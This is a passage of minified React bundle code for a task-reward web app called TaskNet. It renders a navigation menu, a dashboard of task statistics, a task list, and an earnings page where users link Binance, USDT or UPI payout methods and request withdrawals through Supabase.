z-[100]",children:s.jsxs("nav",{className:"flex flex-col p-4 gap-2",children:[J.map(F=>s.jsxs(Mh,{to:F.path,onClick:()=>n(!1),className:({isActive:ne})=>`flex items-center gap-4 px-6 py-4 rounded-2xl transition-all ${ne?"bg-blue-600 text-white":"text-gray-400 hover:text-white hover:bg-white/5"}`,children:[F.icon,s.jsx("span",{className:"font-bold",children:F.label})]},F.path)),s.jsxs("button",{onClick:()=>{n(!1),y>0&&(X.from("admin_alerts").update({is_read:!0}).eq("user_email",E),v(0)),_(!0)},className:"flex items-center justify-between px-6 py-4 mx-2 rounded-2xl bg-blue-600/10 border border-blue-600/20 text-blue-500 hover:bg-blue-600/20 transition-all group",children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx(Nc,{size:18,className:"group-hover:rotate-12 transition-transform"}),s.jsx("span",{className:"font-bold",children:"Notifications"})]}),y>0&&s.jsxs("span",{className:"bg-blue-600 text-white text-[10px] font-black px-2 py-1 rounded-full animate-pulse",children:[y," NEW"]})]}),s.jsx("div",{className:"h-[1px] bg-white/5 my-2 mx-4"}),s.jsxs("div",{className:"flex items-center gap-3 px-6 py-3 mx-2 rounded-xl bg-white/[0.02] border border-white/5",children:[s.jsx("div",{className:"w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center text-sm font-black text-white uppercase",children:te[0]}),s.jsxs("div",{className:"flex-1",children:[s.jsx("p",{className:"font-bold text-white text-sm",children:te}),s.jsx("p",{className:"text-xs text-gray-500",children:E})]})]}),s.jsxs("button",{onClick:()=>{n(!1),a("/account")},className:"flex items-center gap-4 px-6 py-4 rounded-2xl text-gray-400 hover:text-white hover:bg-white/5 transition-all",children:[s.jsx(Wh,{size:18}),s.jsx("span",{className:"font-bold",children:"Account Settings"})]}),s.jsxs("button",{onClick:()=>{H(),n(!1)},className:"flex items-center gap-4 px-6 py-4 rounded-2xl text-red-500 hover:bg-red-500/10 transition-all",children:[s.jsx(Tf,{size:18}),s.jsx("span",{className:"font-bold",children:"Sign Out"})]})]})})]})},ns=({children:a})=>{const r=ur(),n=an(),l=n.pathname==="/login"||n.pathname==="/reddit-login"||n.pathname==="/welcome"||n.pathname==="/privacy"||n.pathname==="/terms";return s.jsxs("div",{className:"min-h-screen bg-black text-white flex flex-col",children:[s.jsx(Gy,{}),s.jsx("main",{className:"flex-1 p-3 sm:p-8 bg-[#050505]",children:a}),!l&&s.jsx("footer",{className:"bg-black border-t border-white/5 p-8 pb-12",children:s.jsxs("div",{className:"max-w-7xl mx-auto flex flex-col md:flex-row items-center justify-between gap-8",children:[s.jsxs("div",{className:"flex items-center gap-6",children:[s.jsxs("button",{onClick:()=>r("/privacy"),className:"flex items-center gap-2 text-gray-500 hover:text-white transition-all text-xs font-bold uppercase tracking-widest group",children:[s.jsx(Sc,{size:16,className:"text-blue-500 group-hover:scale-110 transition-transform"}),"Privacy Policy"]}),s.jsx("span",{className:"text-white/10",children:"|"}),s.jsxs("button",{onClick:()=>r("/terms"),className:"flex items-center gap-2 text-gray-500 hover:text-white transition-all text-xs font-bold uppercase tracking-widest group",children:[s.jsx(Sc,{size:16,className:"text-blue-500 group-hover:scale-110 transition-transform"}),"Terms & Conditions"]}),s.jsx("span",{className:"text-white/10",children:"|"}),s.jsxs("a",{href:"https://discord.gg/3KUHvggF6k",target:"_blank",rel:"noreferrer",className:"flex items-center gap-2 text-gray-500 hover:text-white transition-all text-xs font-bold uppercase tracking-widest group",children:[s.jsx(Er,{size:16,className:"text-blue-500 group-hover:scale-110 transition-transform"}),"Contact using Discord"]})]}),s.jsx("p",{className:"text-[10px] text-gray-700 font-bold uppercase tracking-[0.2em]",children:" 2026 TASKNET NETWORK  SECURE TASKING SYSTEM"})]})})]})},Jy=()=>{const a=ur(),[r,n]=j.useState({show:!1,message:"",type:"info"}),[l,c]=j.useState({active:0,available:0,completed:0}),[u,h]=j.useState(0),[m,x]=j.useState([]),y=Zt("user_email")||localStorage.getItem("user_email")||"";j.useEffect(()=>{k(),v();const S=X.channel("dashboard-tasks").on("postgres_changes",{event:"*",schema:"public",table:"tasks"},()=>{k()}).subscribe(),w=X.channel("dashboard-profile").on("postgres_changes",{event:"UPDATE",schema:"public",table:"profiles",filter:`email=eq.${y}`},()=>{v()}).subscribe();return()=>{X.removeChannel(S),X.removeChannel(w)}},[y]);const v=async()=>{if(!y)return;const{data:S}=await X.from("profiles").select("balance").eq("email",y).single();S&&h(S.balance||0)},k=async()=>{if(!y)return;const{data:S,error:w}=await X.from("tasks").select("status, claimed_by, assigned_to").eq("is_hidden",!1);if(w)console.error("Error fetching task stats:",w);else{const E=S.filter(I=>I.status==="available"&&(I.assigned_to==="All"||I.assigned_to===y)).length,T=S.filter(I=>I.status==="claimed"&&I.claimed_by===y).length,D=S.filter(I=>I.status==="verified"&&I.claimed_by===y).length;c({active:T,available:E,completed:D});const{data:z}=await X.from("tasks").select("id, task_id_display, tier, title, reward, deadline").eq("is_hidden",!1).eq("status","available").or(`assigned_to.eq.All,assigned_to.eq.${y}`).order("created_at",{ascending:!1}).limit(3);z&&x(z)}},_=[{label:"Total Earnings",value:`$${u.toFixed(2)}`,icon:s.jsx(jl,{size:20}),color:"text-blue-500"},{label:"Active Tasks",value:l.active.toString(),icon:s.jsx(Bh,{size:20}),color:"text-emerald-500"},{label:"Completed",value:l.completed.toString(),icon:s.jsx(ux,{size:20}),color:"text-orange-500"},{label:"Available",value:l.available.toString(),icon:s.jsx(ax,{size:20}),color:"text-purple-500"}];return s.jsx(ns,{children:s.jsxs("div",{className:"animate-in fade-in slide-in-from-bottom-4 duration-300",children:[s.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${r.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:s.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${r.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":r.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("div",{className:"flex-shrink-0",children:r.type==="success"?s.jsx(jt,{size:24,strokeWidth:3}):r.type==="error"?s.jsx(De,{size:24,strokeWidth:3}):s.jsx(at,{size:24,strokeWidth:3})}),s.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:r.message})]}),s.jsx("button",{onClick:()=>n(S=>({...S,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:s.jsx(De,{size:18,strokeWidth:3})})]})}),s.jsxs("div",{className:"max-w-7xl mx-auto",children:[s.jsxs("header",{className:"mb-10",children:[s.jsx("h1",{className:"text-3xl font-bold tracking-tight mb-2",children:"Dashboard"}),s.jsx("p",{className:"text-gray-500 text-sm",children:"Welcome back. Here is what's happening today."})]}),s.jsx("div",{className:"grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 sm:gap-6 mb-12",children:_.map((S,w)=>s.jsxs("div",{className:"bg-white/[0.02] border border-white/5 p-6 rounded-3xl hover:border-white/10 transition-all group",children:[s.jsx("div",{className:`w-10 h-10 rounded-2xl bg-white/[0.03] flex items-center justify-center mb-4 ${S.color} group-hover:scale-110 transition-transform`,children:S.icon}),s.jsx("p",{className:"text-gray-500 text-sm font-medium mb-1",children:S.label}),s.jsx("p",{className:"text-2xl font-bold",children:S.value})]},w))}),s.jsx("div",{className:"grid grid-cols-1 gap-8",children:s.jsxs("section",{className:"bg-white/[0.02] border border-white/5 rounded-3xl p-4 sm:p-8",children:[s.jsxs("div",{className:"flex items-center justify-between mb-8",children:[s.jsx("h2",{className:"text-xl font-bold",children:"Available Tasks"}),s.jsxs("button",{onClick:()=>a("/tasks"),className:"text-xs font-semibold text-blue-500 hover:text-blue-400 flex items-center gap-1 group",children:["View All ",s.jsx(Vc,{size:14,className:"group-hover:translate-x-1 transition-transform"})]})]}),s.jsx("div",{className:"space-y-4",children:m.length>0?m.map(S=>s.jsxs("div",{onClick:()=>a(`/task/${S.id}`),className:"p-5 bg-white/[0.03] border border-white/5 rounded-2xl flex items-center justify-between group cursor-pointer hover:border-blue-500/30 transition-all",children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("div",{className:`w-12 h-12 rounded-xl flex items-center justify-center shrink-0 ${S.tier==="Tier 3"?"bg-red-500/10 text-red-500":S.tier==="Tier 2"?"bg-amber-500/10 text-amber-500":"bg-emerald-500/10 text-emerald-500"}`,children:s.jsx(Ds,{size:20})}),s.jsxs("div",{children:[s.jsxs("div",{className:"flex items-center gap-2 mb-1",children:[s.jsx("span",{className:"text-[10px] font-black text-blue-500",children:S.task_id_display}),s.jsx("h3",{className:"text-sm font-bold text-white",children:S.title})]}),s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsx("span",{className:"text-[9px] font-black uppercase text-gray-500 tracking-widest",children:S.tier}),s.jsx("div",{className:"w-1 h-1 bg-gray-800 rounded-full"}),s.jsxs("div",{className:"flex items-center gap-1 text-[10px] text-gray-600",children:[s.jsx(Fr,{size:10}),new Date(S.deadline).toLocaleDateString()]})]})]})]}),s.jsxs("div",{className:"text-right",children:[s.jsxs("p",{className:"text-lg font-black text-white",children:["$",S.reward]}),s.jsx("p",{className:"text-[9px] font-black text-emerald-500 uppercase tracking-widest",children:"Available"})]})]},S.id)):s.jsxs("div",{className:"flex flex-col items-center justify-center py-20 text-center border border-dashed border-white/10 rounded-2xl",children:[s.jsx("div",{className:"w-12 h-12 bg-white/[0.02] rounded-full flex items-center justify-center mb-4",children:s.jsx(Bh,{size:24,className:"text-gray-600"})}),s.jsx("p",{className:"text-gray-500 text-sm",children:"No tasks available yet."})]})})]})})]})]})})},Yy=()=>{const a=ur(),[r,n]=j.useState("All Tasks"),[l,c]=j.useState([]),[u,h]=j.useState(!0),[m,x]=j.useState(""),[y,v]=j.useState({show:!1,message:"",type:"info"}),k=["All Tasks","Active","Pending","Completed"];j.useEffect(()=>{_()},[]);const _=async()=>{h(!0),Zt("user_email")||localStorage.getItem("user_email");const{data:w,error:E}=await X.from("tasks").select("*").eq("is_hidden",!1).order("created_at",{ascending:!1});E?console.error("Error fetching tasks:",E):c(w||[]),h(!1)},S=l.filter(w=>{const E=Zt("user_email")||localStorage.getItem("user_email")||"Guest";return w.title.toLowerCase().includes(m.toLowerCase())||w.category.toLowerCase().includes(m.toLowerCase())?r==="All Tasks"?w.status==="available"||w.claimed_by===E:r==="Active"?w.status==="claimed"&&w.claimed_by===E:r==="Pending"?w.status==="submitted"&&w.claimed_by===E:r==="Completed"?w.status==="verified"&&w.claimed_by===E:!0:!1});return s.jsx(ns,{children:s.jsxs("div",{className:"animate-in fade-in slide-in-from-bottom-4 duration-300",children:[s.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${y.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:s.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${y.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":y.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("div",{className:"flex-shrink-0",children:y.type==="success"?s.jsx(jt,{size:24,strokeWidth:3}):y.type==="error"?s.jsx(De,{size:24,strokeWidth:3}):s.jsx(at,{size:24,strokeWidth:3})}),s.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:y.message})]}),s.jsx("button",{onClick:()=>v(w=>({...w,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:s.jsx(De,{size:18,strokeWidth:3})})]})}),s.jsxs("div",{className:"max-w-7xl mx-auto",children:[s.jsx("header",{className:"mb-10",children:s.jsxs("div",{children:[s.jsx("h1",{className:"text-3xl font-bold tracking-tight mb-2",children:"Tasks"}),s.jsx("p",{className:"text-gray-500 text-sm",children:"Manage and track your assigned tasks."})]})}),s.jsxs("div",{className:"flex flex-col md:flex-row items-start md:items-center justify-between gap-6 mb-8",children:[s.jsx("div",{className:"flex flex-wrap bg-white/[0.03] border border-white/5 p-1 rounded-xl",children:k.map((w,E)=>s.jsx("button",{onClick:()=>n(w),className:`flex-1 sm:flex-none px-4 sm:px-6 py-2 rounded-lg text-xs sm:text-sm font-medium transition-all ${r===w?"bg-blue-600 text-white shadow-lg shadow-blue-600/20":"text-gray-500 hover:text-white"}`,children:w},E))}),s.jsx("div",{className:"flex items-center gap-3 w-full md:w-auto",children:s.jsxs("div",{className:"relative flex-1 md:w-80",children:[s.jsx(Gc,{className:"absolute left-4 top-1/2 -translate-y-1/2 text-gray-500",size:18}),s.jsx("input",{type:"text",placeholder:"Search tasks...",value:m,onChange:w=>x(w.target.value),className:"w-full pl-12 pr-4 py-2.5 bg-white/[0.03] border border-white/5 rounded-xl focus:outline-none focus:border-blue-500 transition-all text-sm"})]})})]}),s.jsx("div",{className:"bg-white/[0.02] border border-white/5 rounded-3xl overflow-hidden",children:s.jsx("div",{className:"overflow-x-auto",children:s.jsxs("table",{className:"w-full text-left",children:[s.jsx("thead",{children:s.jsxs("tr",{className:"border-b border-white/5 text-xs font-bold text-gray-500 uppercase tracking-wider",children:[s.jsx("th",{className:"py-5 px-8",children:"ID"}),s.jsx("th",{className:"py-5 px-8",children:"Task Name"}),s.jsx("th",{className:"py-5 px-8",children:"Category"}),s.jsx("th",{className:"py-5 px-8 text-right",children:"Reward"}),s.jsx("th",{className:"py-5 px-8 text-right",children:"Action"})]})}),s.jsx("tbody",{children:u?s.jsx("tr",{children:s.jsxs("td",{colSpan:5,className:"py-20 text-center",children:[s.jsx("div",{className:"w-8 h-8 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"}),s.jsx("p",{className:"text-gray-500 text-sm",children:"Loading tasks..."})]})}):S.length>0?S.map(w=>s.jsxs("tr",{className:"border-b border-white/5 text-sm hover:bg-white/[0.01] transition-colors group",children:[s.jsx("td",{className:"py-5 px-8",children:s.jsx("span",{className:"text-[10px] font-black text-blue-500",children:w.task_id_display||"#000000"})}),s.jsx("td",{className:"py-5 px-8",children:s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsx("div",{className:`w-8 h-8 rounded-lg flex items-center justify-center shrink-0 ${w.status==="verified"?"bg-emerald-500 text-white":w.status==="submitted"?"bg-amber-500 text-white":w.tier==="Tier 3"?"bg-red-500/10 text-red-500":w.tier==="Tier 2"?"bg-amber-500/10 text-amber-500":"bg-emerald-500/10 text-emerald-500"}`,children:w.status==="verified"?s.jsx(jt,{size:14,strokeWidth:3}):w.status==="submitted"?s.jsx(at,{size:14,strokeWidth:3}):s.jsx(Ds,{size:14})}),s.jsxs("div",{children:[s.jsx("div",{className:"font-bold text-white",children:w.title}),s.jsx("div",{className:"flex items-center gap-2 text-[10px] text-gray-500 mt-0.5 uppercase tracking-widest font-black",children:w.tier||"Tier 1"})]})]})}),s.jsx("td",{className:"py-5 px-8",children:s.jsx("span",{className:"bg-white/5 px-3 py-1 rounded-full text-[10px] font-bold text-gray-500 border border-white/5 uppercase",children:w.category})}),s.jsxs("td",{className:"py-5 px-8 font-black text-white text-right",children:["$",w.reward]}),s.jsx("td",{className:"py-5 px-8 text-right",children:w.status==="verified"?s.jsx("span",{className:"text-[10px] font-black text-emerald-500 uppercase tracking-widest bg-emerald-500/10 px-3 py-1.5 rounded-lg border border-emerald-500/20",children:"Completed"}):w.status==="submitted"?s.jsx("span",{className:"text-[10px] font-black text-amber-500 uppercase tracking-widest bg-amber-500/10 px-3 py-1.5 rounded-lg border border-amber-500/20",children:"Pending"}):s.jsx("button",{onClick:()=>a(`/task/${w.id}`),className:"px-5 py-2 bg-blue-600 text-white rounded-lg text-xs font-black uppercase tracking-widest hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20",children:w.status==="claimed"?"Continue":"Claim"})})]},w.id)):s.jsx("tr",{children:s.jsx("td",{colSpan:5,className:"py-32 px-8",children:s.jsxs("div",{className:"flex flex-col items-center justify-center text-center",children:[s.jsx("div",{className:"w-16 h-16 bg-white/[0.03] rounded-full flex items-center justify-center mb-6",children:s.jsx(Cf,{size:32,className:"text-gray-600"})}),s.jsx("h3",{className:"text-lg font-bold mb-2",children:"No tasks found"}),s.jsx("p",{className:"text-gray-500 text-sm max-w-xs",children:"You don't have any tasks assigned at the moment. Check back later for new opportunities."})]})})})})]})})})]})]})})},es={binance:"https://cryptologos.cc/logos/binance-coin-bnb-logo.png",usdt:"https://cryptologos.cc/logos/tether-usdt-logo.png",upi:"https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/UPI-Logo-vector.svg/1200px-UPI-Logo-vector.svg.png"},al={binance:"Binance ID",usdt:"USDT Wallet",upi:"UPI ID"},Qy=()=>{const[a,r]=j.useState(0),[n,l]=j.useState(!0),c=Zt("user_email")||localStorage.getItem("user_email")||"",[u,h]=j.useState([]),[m,x]=j.useState(!1),[y,v]=j.useState(!1),[k,_]=j.useState(!1),[S,w]=j.useState(null),[E,T]=j.useState(""),[D,z]=j.useState(null),[I,H]=j.useState(null),[te,J]=j.useState(!1),[F,ne]=j.useState(!1),[ue,Ee]=j.useState(null),[ze,Fe]=j.useState([]),[Re,de]=j.useState({show:!1,message:"",type:"info"}),ae=(B,Ae="info")=>{de({show:!0,message:B,type:Ae}),setTimeout(()=>de(et=>({...et,show:!1})),2e3)};j.useEffect(()=>{c&&(he(),U(),we())},[c]);const we=async()=>{const{data:B}=await X.from("withdrawal_requests").select("*").eq("user_email",c).order("created_at",{ascending:!1});B&&Fe(B)},he=async()=>{l(!0);const{data:B}=await X.from("profiles").select("balance").eq("email",c).single();B&&r(B.balance||0),l(!1)},U=async()=>{const{data:B}=await X.from("profiles").select("payout_methods").eq("email",c).single();if(B?.payout_methods){const Ae=B.payout_methods;h(Ae),Ae.length>0&&Ee(Ae[0].id)}},Z=async()=>{if(u.length===0){ae("Please add a payout method first.","error");return}if(a<1){ae("Minimum withdrawal amount is $1.00","error");return}const B=u.find(Ae=>Ae.id===ue);if(!B){ae("Please select a payout method.","error");return}ne(!0);try{const Ae=`#TXN${Math.floor(1e5+Math.random()*9e5)}`,{error:et}=await X.from("withdrawal_requests").insert({transaction_id:Ae,user_email:c,amount:a,payout_method:B,status:"pending"});if(et)throw et;const{error:ct}=await X.from("profiles").update({balance:0}).eq("email",c);if(ct)throw ct;ae("Withdrawal request submitted! Transaction ID: "+Ae,"success"),r(0),we()}catch(Ae){ae("Error processing withdrawal: "+Ae.message,"error")}finally{ne(!1)}},ee=async B=>{const{error:Ae}=await X.from("profiles").update({payout_methods:B}).eq("email",c);return Ae?(ae("Error saving payout method: "+Ae.message,"error"),!1):!0},R=async()=>{if(!S||!E.trim())return;J(!0);const B={id:Date.now().toString(),type:S,value:E.trim(),label:al[S]},Ae=[...u,B];await ee(Ae)&&(h(Ae),ae("Payout method added successfully!","success"),_e()),J(!1)},M=async()=>{if(!D||!E.trim())return;J(!0);const B=u.map(et=>et.id===D.id?{...et,value:E.trim()}:et);await ee(B)&&(h(B),ae("Payout method updated!","success"),Q()),J(!1)},be=async()=>{if(!I)return;J(!0);const B=u.filter(et=>et.id!==I.id);await ee(B)&&(h(B),ae("Payout method removed.","success"),fe()),J(!1)},je=B=>{z(B),T(B.value),v(!0)},Ce=B=>{H(B),_(!0)},_e=()=>{x(!1),w(null),T("")},Q=()=>{v(!1),z(null),T("")},fe=()=>{_(!1),H(null)},xe=B=>{switch(B){case"binance":return"Enter your Binance ID (e.g. 123456789)";case"usdt":return"Enter your USDT wallet address (TRC20)";case"upi":return"Enter your UPI ID (e.g. name@upi)";default:return"Enter value"}};return s.jsxs(ns,{children:[s.jsx("div",{className:`fixed top-6 left-6 right-6 md:left-auto md:right-10 z-[100] pointer-events-none flex justify-center md:justify-end transition-all duration-300 transform ${Re.show?"opacity-100 translate-y-0 scale-100":"opacity-0 -translate-y-4 scale-95"}`,children:s.jsxs("div",{className:`flex items-center justify-between gap-4 px-8 py-5 rounded-[24px] border backdrop-blur-2xl shadow-[0_20px_50px_rgba(0,0,0,0.3)] pointer-events-auto min-w-[280px] max-w-[90vw] md:max-w-md ${Re.type==="success"?"bg-emerald-500/15 border-emerald-500/30 text-emerald-400":Re.type==="error"?"bg-red-500/15 border-red-500/30 text-red-400":"bg-blue-500/15 border-blue-500/30 text-blue-400"}`,children:[s.jsxs("div",{className:"flex items-center gap-4",children:[s.jsx("div",{className:"flex-shrink-0",children:Re.type==="success"?s.jsx(jt,{size:24,strokeWidth:3}):Re.type==="error"?s.jsx(De,{size:24,strokeWidth:3}):s.jsx(at,{size:24,strokeWidth:3})}),s.jsx("span",{className:"font-bold text-base tracking-tight leading-tight",children:Re.message})]}),s.jsx("button",{onClick:()=>de(B=>({...B,show:!1})),className:"flex-shrink-0 ml-2 p-1 hover:bg-white/10 rounded-full transition-colors",children:s.jsx(De,{size:18,strokeWidth:3})})]})}),s.jsxs("div",{className:"max-w-7xl mx-auto",children:[s.jsxs("header",{className:"mb-10",children:[s.jsx("h1",{className:"text-3xl font-bold tracking-tight mb-2",children:"Earnings"}),s.jsx("p",{className:"text-gray-500 text-sm",children:"Manage your payouts and withdrawal history."})]}),s.jsxs("div",{className:"grid grid-cols-1 lg:grid-cols-3 gap-6 sm:gap-8 mb-12",children:[s.jsxs("div",{className:"lg:col-span-2 bg-blue-600 rounded-3xl p-6 sm:p-8 text-white flex flex-col justify-between relative overflow-hidden group",children:[s.jsxs("div",{className:"relative z-10",children:[s.jsxs("div",{className:"flex items-center justify-between mb-6 sm:mb-8",children:[s.jsx("div",{className:"w-10 h-10 sm:w-12 sm:h-12 bg-white/20 rounded-xl flex items-center justify-center",children:s.jsx(Hn,{size:20,className:"sm:size-6"})}),s.jsx("button",{onClick:()=>ae("Transaction history is already up to date.","info"),className:"text-xs sm:text-sm font-bold bg-white/10 px-3 py-1.5 sm:px-4 sm:py-2 rounded-xl hover:bg-white/20 transition-all",children:"History"})]}),s.jsxs("div",{children:[s.jsx("p",{className:"text-blue-100 text-xs sm:text-sm font-medium mb-1 sm:mb-2",children:"Available Balance"}),s.jsxs("p",{className:"text-4xl sm:text-5xl font-bold mb-6 sm:mb-8",children:["$",a.toFixed(2)]})]}),u.length>0&&s.jsxs("div",{className:"mb-6 space-y-3",children:[s.jsx("p",{className:"text-blue-100 text-[10px] sm:text-xs font-bold uppercase tracking-wider",children:"Select Payout Method"}),s.jsx("div",{className:"flex flex-wrap gap-2",children:u.map(B=>s.jsxs("button",{onClick:()=>Ee(B.id),className:`flex items-center gap-2 px-3 py-1.5 sm:px-4 sm:py-2 rounded-xl border transition-all ${ue===B.id?"bg-white text-blue-600 border-white shadow-lg":"bg-white/10 text-white border-white/10 hover:bg-white/20"}`,children:[s.jsx("img",{src:es[B.type],alt:"",className:"w-3.5 h-3.5 sm:w-4 sm:h-4 object-contain"}),s.jsx("span",{className:"text-[10px] sm:text-xs font-bold",children:B.label})]},B.id))})]}),s.jsxs("button",{onClick:Z,disabled:F||a<1||u.length===0,className:"w-full sm:w-auto px-6 py-3.5 sm:px-8 sm:py-4 bg-white text-blue-600 rounded-2xl font-bold text-sm hover:shadow-xl hover:shadow-blue-900/40 transition-all flex items-center justify-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed",children:[F?"Processing...":"Withdraw Funds",s.jsx(ex,{size:18})]})]}),s.jsx("div",{className:"absolute bottom-[-20%] right-[-5%] w-48 h-48 sm:w-64 sm:h-64 bg-white/10 rounded-full blur-3xl"})]}),s.jsxs("div",{className:"bg-white/[0.02] border border-white/5 rounded-3xl p-6 md:p-8",children:[s.jsxs("h3",{className:"text-lg font-bold mb-6 flex items-center gap-2",children:[s.jsx(jl,{size:20,className:"text-blue-500"}),"Payout Methods"]}),s.jsxs("div",{className:"space-y-3",children:[u.map(B=>s.jsx("div",{className:"p-4 bg-white/[0.02] border border-white/5 rounded-2xl hover:border-white/10 transition-all",children:s.jsxs("div",{className:"flex items-center gap-3",children:[s.jsx("div",{className:"w-10 h-10 md:w-12 md:h-12 bg-white rounded-xl flex items-center justify-center flex-shrink-0 p-2",children:s.jsx("img",{src:es[B.type],alt:B.label,className:"w-full h-full object-contain"})}),s.jsxs("div",{className:"flex-1 min-w-0",children:[s.jsx("p",{className:"text-xs font-bold text-gray-400 uppercase tracking-wider mb-0.5",children:B.label}),s.jsx("p",{className:"text-sm font-bold text-white truncate",children:B.value})]}),s.jsxs("div",{className:"flex items-center gap-1 flex-shrink-0",children:[s.jsx("button",{onClick:()=>je(B),className:"p-2 text-gray-500 hover:text-blue-500 hover:bg-blue-500/10 rounded-xl transition-all",title:"Edit",children:s.jsx(Kc,{size:16})}),s.jsx("button",{onClick:()=>Ce(B),className:"p-2 text-gray-500 hover:text-red-500 hover:bg-red-500/10 rounded-xl transition-all",title:"Remove",children:s.jsx($s,{size:16})})]})]})},B.id)),u.length===0?s.jsxs("div",{className:"p-4 border border-dashed border-white/10 rounded-2xl flex flex-col items-center justify-center text-center py-10",children:[s.jsx("p",{className:"text-gray-500 text-xs mb-4",children:"No payout methods linked."}),s.jsxs("button",{onClick:()=>x(!0),className:"text-blue-500 text-xs font-bold hover:underline flex items-center gap-1",children:[s.jsx(ml,{size:14}),"Add Method"]})]}):s.jsx(s.Fragment,{children:u.length<3&&s.jsxs("button",{onClick:()=>x(!0),className:"w-full p-4 border border-dashed border-white/10 rounded-2xl text-blue-500 text-xs font-bold hover:border-blue-500/30 hover:bg-blue-500/5 transition-all flex items-center justify-center gap-2",children:[s.jsx(ml,{size:14}),"Add Another Payout Method"]})})]})]})]}),s.jsxs("section",{className:"bg-white/[0.02] border border-white/5 rounded-3xl overflow-hidden",children:[s.jsxs("div",{className:"p-8 border-b border-white/5 flex items-center justify-between",children:[s.jsxs("h2",{className:"text-xl font-bold flex items-center gap-3",children:[s.jsx(sx,{size:20,className:"text-gray-500"}),"Transaction History"]}),s.jsx("select",{className:"bg-transparent text-sm text-gray-500 focus:outline-none",children:s.jsx("option",{children:"Last 30 days"})})]}),s.jsx("div",{className:"overflow-x-auto",children:s.jsxs("table",{className:"w-full text-left",children:[s.jsx("thead",{children:s.jsxs("tr",{className:"border-b border-white/5 text-xs font-bold text-gray-500 uppercase tracking-wider",children:[s.jsx("th",{className:"py-5 px-8",children:"Transaction ID"}),s.jsx("th",{className:"py-5 px-8",children:"Date"}),s.jsx("th",{className:"py-5 px-8",children:"Method"}),s.jsx("th",{className:"py-5 px-8 text-right",children:"Amount"}),s.jsx("th",{className:"py-5 px-8 text-right",children:"Status"})]})}),s.jsx("tbody",{children:ze.length>0?ze.map((B,Ae)=>s.jsxs("tr",{className:"border-b border-white/5 text-sm hover:bg-white/[0.01] transition-colors",children:[s.jsx("td",{className:"py-5 px-8 font-mono text-xs text-blue-500",children:B.transaction_id}),s.jsx("td",{className:"py-5 px-8 text-gray-400",children:new Date(B.created_at).toLocaleDateString([],{month:"short",day:"numeric",year:"numeric"})}),s.jsx("td",{className:"py-5 px-8",children:s.jsxs("div",{className:"flex items-center gap-2",children:[s.jsx("img",{src:es[B.payout_method.type],alt:"",className:"w-4 h-4 object-contain"}),s.jsx("span",{className:"text-xs text-gray-300",children:B.payout_method.label})]})}),s.jsxs("td",{className:"py-5 px-8 text-right font-bold text-white",children:["$",B.amount.toFixed(2)]}),s.jsx("td",{className:"py-5 px-8 text-right",children:s.jsx("span",{className:`text-[10px] font-black uppercase tracking-widest px-2 py-1 rounded ${B.status==="completed"?"bg-emerald-500/10 text-emerald-500":B.status==="rejected"?"bg-red-500/10 text-red-500":"bg-amber-500/10 text-amber-500"}`,children:B.status})})]},Ae)):s.jsx("tr",{children:s.jsx("td",{colSpan:5,className:"py-32 px-8",children:s.jsxs("div",{className:"flex flex-col items-center justify-center text-center",children:[s.jsx("div",{className:"w-16 h-16 bg-white/[0.03] rounded-full flex items-center justify-center mb-6",children:s.jsx(Cf,{size:32,className:"text-gray-600"})}),s.jsx("h3",{className:"text-lg font-bold mb-2",children:"No transactions"}),s.jsx("p",{className:"text-gray-500 text-sm max-w-xs",children:"Your transaction history will appear here once you make your first withdrawal."})]})})})})]})})]})]}),m&&s.jsx("div",{className:"fixed inset-0 z-[200] flex items-center justify-center p-4 bg-black/80 backdrop-blur-sm animate-in fade-in duration-300",children:s.jsxs("div",{className:"w-full max-w-md bg-[#0a0a0a] border border-white/10 rounded-[32px] p-6 md:p-8 shadow-2xl animate-in zoom-in duration-300 max-h-[90vh] overflow-y-auto",children:[s.jsxs("div",{className:"flex items-center justify-between mb-6",children:[s.jsx("h2",{className:"text-xl font-black tracking-tight uppercase",children:"Add Payout Method"}),s.jsx("button",{onClick:_e,className:"p-2 hover:bg-white/10 rounded-xl transition-colors",children:s.jsx(De,{size:20})})]}),S?s.jsxs("div",{className:"space-y-6",children:[s.jsxs("div",{className:"flex items-center gap-3 p-4 bg-white/[0.02] border border-white/5 rounded-2xl",children:[s.jsx("div",{className:"w-10 h-10 bg-white rounded-xl flex items-center justify-center p-2",children:s.jsx("img",{src:es[S],alt:al[S],className:"w-full h-full 